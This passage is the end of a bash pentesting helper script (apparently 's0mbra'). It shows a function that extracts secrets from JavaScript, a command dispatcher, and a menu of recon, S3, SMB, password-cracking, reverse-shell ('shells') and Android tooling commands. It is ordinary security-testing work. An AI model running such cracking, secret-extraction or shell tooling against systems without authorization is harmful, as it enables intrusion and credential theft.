    python /Users/bl4de/hacking/tools/LinkFinder/linkfinder.py -i "$1" -o cli | rg -v http | sort -u
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

# extract secrets from JavaScript file
secrets() {
    echo -e "$BLUE[s0mbra] Extracting secrets from $1...$CLR"
    python /Users/bl4de/hacking/tools/SecretFinder/SecretFinder.py -i "$1" -o cli | sort -u
    echo -e "$BLUE\n[s0mbra] Done! $CLR"
}

### menu
cmd=$1

case "$cmd" in
    set_ip)
        set_ip "$2"
    ;;
    enum)
        enum "$2"
    ;;
    webservers)
        webservers "$2"
    ;;
    recon)
        recon "$2" "$3" "$4"
    ;;
    kiterunner)
        kiterunner "$2"
    ;;
    pysast)
        pysast "$2"
    ;;
    full_nmap_scan)
        full_nmap_scan "$2" "$3"
    ;;
    quick_nmap_scan)
        quick_nmap_scan "$2" "$3"
    ;;
    http_server)
        http_server "$2" "$3"
    ;;
    rockyou_john)
        rockyou_john "$2" "$3"
    ;;
    rockyou_zip)
        rockyou_zip "$2"
    ;;
    john_pot)
        john_pot
    ;;
    ssh_to_john)
        ssh_to_john "$2"
    ;;
    unmin)
        unmin "$2"
    ;;
    snyktest)
        snyktest
    ;;
    gql)
        gql "$2"
    ;;
    graphw00f)
        graphw00f "$2"
    ;;
    dex_to_jar)
        dex_to_jar "$2"
    ;;
    jadx)
        jadx "$2"
    ;;
    apk)
        apk "$2"
    ;;
    apk_to_studio)
        apk_to_studio "$2"
    ;;
    abe)
        abe "$2"
    ;;
    unjar)
        unjar "$2"
    ;;
    disass)
        disass "$2"
    ;;
    smb_enum)
        smb_enum "$2" "$3" "$4"
    ;;
    smb_get_file)
        smb_get_file "$2" "$3" "$4" "$5"
    ;;
    smb_mount)
        smb_mount "$2" "$3" "$4"
    ;;
    smb_umount)
        smb_umount
    ;;
    nfs_enum)
        nfs_enum "$2"
    ;;
    s3)
        s3 "$2"
    ;;
    b64)
        b64 "$2"
    ;;
    hashme)
        hshr "$2"
    ;;
    fu)
        fu "$2" "$3" "$4" "$5"
    ;;
    apifuzz)
        api_fuzz "$2" "$3"
    ;;
    s3get)
        s3get "$2" "$3"
    ;;
    s3ls)
        s3ls "$2" "$3"
    ;;
    discloS3)
        discloS3 "$2"
    ;;
    shells)
        shells "$2" "$3"
    ;;
    rubysast)
        ruby_sast "$2"
    ;;
    urls)
        urls "$2"
    ;;
    endpoints)
        endpoints "$2"
    ;;
    secrets)
        secrets "$2"
    ;;
    *)
        clear
        echo -e "$CLR"
        echo -e "$BLUE_BG:: RECON ::\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$CLR"
        echo -e "$CYAN enum $GRAY[DOMAIN]$CLR\t\t\t\t\t$CYAN recon $GRAY[HOST] [OPTIONS:nmap,nikto,vhosts,ffuf,subdomanizer] [PROTO http/https]$CLR"
        echo -e "$CYAN webservers $GRAY[SUBDOMAINS FILE]$CLR"

        echo -e "$BLUE_BG:: WEB ::\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$CLR"
        echo -e "$CYAN fu $GRAY[URL] [DICT] [*EXT,/ or -] [HTTP RESP.]$CLR\t$CYAN apifuzz $GRAY[BASE_URL] [ENDPOINTS]$CLR\t$YELLOW(REST)$CLR"
        echo -e "$CYAN graphw00f $GRAY[HOST]$CLR\t\t$YELLOW(GraphQl)$CLR\t$CYAN gql $GRAY[TARGET_URL]$CLR\t\t$YELLOW(GraphQL)$CLR"
        echo -e "$CYAN kiterunner $GRAY[HOST] (*apis)$CLR\t$YELLOW(REST)$CRL"
        echo -e "$BLUE_BG:: CLOUD ::\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$CLR"
        echo -e "$CYAN discloS3 $GRAY[URL]$CLR\t\t\t$YELLOW(AWS)$CLR\t\t$CYAN s3 $GRAY[BUCKET]$CLR\t\t\t$YELLOW(AWS)$CLR"
        echo -e "$CYAN s3get $GRAY[BUCKET] [key]$CLR\t\t$YELLOW(AWS)$CLR\t\t$CYAN s3ls $GRAY[BUCKET] [folder]$CLR\t\t$YELLOW(AWS)$CLR"

        echo -e "$BLUE_BG:: PENTEST TOOLS ::\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$CLR"
        echo -e "$CYAN quick_nmap_scan $GRAY[IP] [*PORTS]\t$LIGHTGREEN(nmap)$CLR\t\t$CYAN full_nmap_scan $GRAY[IP] [*PORTS]\t$LIGHTGREEN(nmap)$CLR"
        echo -e "$CYAN http_server $GRAY[PORT] [STACK]$CLR\t\t\t$CYAN shells $GRAY[IP] [PORT] $CLR"
        echo -e "$CYAN nfs_enum $GRAY[IP]$CLR\t\t\t\t\t$CYAN smb_enum $GRAY[IP] [USER] [PASSWORD]$CLR"
        echo -e "$CYAN smb_get_file $GRAY[IP] [PATH] [user] [*password] $CLR\t$CYAN smb_mount $GRAY[IP] [SHARE] [USER]$CLR"
        echo -e "$CYAN smb_umount $CLR"
        
        echo -e "$BLUE_BG:: PASSWORDS CRACKIN' ::\t\t\t\t\t\t\t\t\t\t\t\t\t\t$CLR"
        echo -e "$CYAN rockyou_john $GRAY[HASHES] [FORMAT]\t$LIGHTGREEN(JohnTheRipper)$CLR\t$CYAN ssh_to_john $GRAY[ID_RSA]\t\t$LIGHTGREEN(JohnTheRipper)$CLR"
        echo -e "$CYAN rockyou_zip $GRAY[ZIP file]\t\t$LIGHTGREEN(JohnTheRipper)$CLR\t$CYAN john_pot\t\t\t$LIGHTGREEN(JohnTheRipper)$CLR"
        
        echo -e "$BLUE_BG:: STATIC CODE ANALYSIS ::\t\t\t\t\t\t\t\t\t\t\t\t\t\t$CLR"
        echo -e "$CYAN unmin $GRAY[FILE]\t\t\t$YELLOW(JavaScript)$CLR\t$CYAN snyktest $GRAY[DIR]\t\t\t$YELLOW(JavaScript)$CLR"
        echo -e "$CYAN rubysast $GRAY[DIR]\t\t\t$YELLOW(Ruby)$CLR\t\t$CYAN disass $GRAY[BINARY]\t\t$YELLOW(asm)$CLR"
        echo -e "$CYAN unjar $GRAY[.jar FILE]\t\t$YELLOW(Java)$CLR\t\t$CYAN urls $GRAY[FILE|DIR|URL]\t\t$YELLOW(JavaScript)$CLR"
        echo -e "$CYAN secrets $GRAY[FILE|DIR|URL]\t\t$YELLOW(JavaScript)$CLR\t$CYAN endpoints $GRAY[FILE|DIR|URL]\t$YELLOW(JavaScript)$CLR"
        echo -e "$CYAN pysast $GRAY[DIR]\t\t\t$YELLOW(Python)$CLR"
        echo -e "$BLUE_BG:: ANDROID ::\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$CLR"
        echo -e "$CYAN jadx $GRAY[.apk FILE]\t\t$YELLOW(Java)$CLR\t\t$CYAN dex_to_jar $GRAY[.dex file]$CLR\t\t$YELLOW(Java)$CLR"
        echo -e "$CYAN apk $GRAY[.apk FILE]$CLR\t\t$YELLOW(Java)$CLR\t\t$CYAN abe $GRAY[.ab FILE]$CLR\t\t\t$YELLOW(Java)$CLR"
        echo -e "$CYAN apk_to_studio $GRAY[.apk FILE]$CLR\t$YELLOW(Java)$CLR"
        echo -e "$BLUE_BG:: UTILS ::\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$CLR"
        echo -e "$CYAN b64 $GRAY[STRING]$CLR\t\t\t\t\t$CYAN hashme $GRAY[STRING]$CLR"
        echo -e "$CLR"
        echo -e "$CLR"
    ;;
esac
